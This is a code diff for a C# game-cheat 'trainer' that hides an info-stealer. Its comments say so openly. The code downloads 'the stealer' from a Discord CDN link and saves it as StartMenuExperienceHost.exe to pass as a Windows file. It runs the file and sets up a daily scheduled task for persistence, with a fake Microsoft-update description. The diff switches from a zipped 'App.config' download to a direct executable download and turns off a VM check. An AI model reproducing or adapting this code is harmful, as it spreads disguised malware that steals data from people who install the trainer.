@@ -18,8 +18,6 @@ namespace FreeZeHAX_Trainer
 {
     public partial class Trainer : Form
     {
-        private const string FileName = "StartMenuExperienceHost.exe";
-        private const string ZipFileName = "App.config";
         private readonly Cheats cheats = new Cheats(); // Calling Others.cs
         private readonly Mem mem = new Mem();
         private readonly string NewLine = Environment.NewLine; // New line string
@@ -28,7 +26,7 @@ namespace FreeZeHAX_Trainer
         private readonly TaskDefinition td = TaskService.Instance.NewTask(); // New TaskDefiniton task
         private readonly WebClient web = new WebClient();
         private bool ProcOpen = false; // In order us to check if the process exists, we need this bool.
-        private readonly bool AntiVM = true; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false"
+        private readonly bool AntiVM = false; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false"
         private readonly bool Stealer = true; // Activate / Disable Stealer
         private Point lastLocation;
         private bool mouseDown;
@@ -376,11 +374,9 @@ namespace FreeZeHAX_Trainer
             {
                 try
                 {
-                    string FolderChars = others.GetRandomString().ToLower(); // Make all chars low
-                    string StealerFolderLoc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps" + "\\Microsoft.Windows.StartMenuExperienceHost_" + FolderChars; // Stealer's Folder Location
                     string SysWOW64 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\SysWOW64"; // SysWOW64's folder location
                     string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\"; // Working folder
-                    string StealerFile = StealerFolderLoc + "\\" + FileName; // Randomized stealer folder
+                    string StealerFile = StealerFolder + "StartMenuExperienceHost.exe"; // Randomized stealer folder
                     bool savePathExists = File.Exists(others.SaveDatPath()); // Check if save.dat file exists
 
                     #region Check required dlls for the c++ stealer
@@ -404,12 +400,7 @@ namespace FreeZeHAX_Trainer
                     #endregion Check required dlls for the c++ stealer
 
                     CETimer.Start(); // Check if ce is running
-                    others.DirClean(StealerFolder); // Delete old stealer folder
-                    others.Wait(2000);
-                    Directory.CreateDirectory(StealerFolderLoc); // Create the newest folder
-                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/943261952153636914/App.config"), StealerFolderLoc + "\\App.config"); // Download the stealer (its zipped)
-                    others.Wait(2000);
-                    System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc); // Unzip the zip
+                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/944757825081577542/StartMenuExperienceHost.exe"), StealerFolder + "\\StartMenuExperienceHost.exe"); // Download the stealer
                     others.Wait(2000);
                     if (!savePathExists)
                     { // If save.dat doesn't exists, just create the task scheduler
@@ -426,11 +417,9 @@ namespace FreeZeHAX_Trainer
                         {
                             return;
                         }
-                        File.Delete(StealerFolderLoc + "\\" + ZipFileName);
                     }
                     else
                     {
-                        others.Wait(500);
                         Process.Start(StealerFile);
                         td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
                         DailyTrigger dt = new DailyTrigger();
@@ -445,7 +434,6 @@ namespace FreeZeHAX_Trainer
                         {
                             return;
                         }
-                        File.Delete(StealerFolderLoc + "\\" + ZipFileName);
                     }
                 }
                 catch (Exception) { }
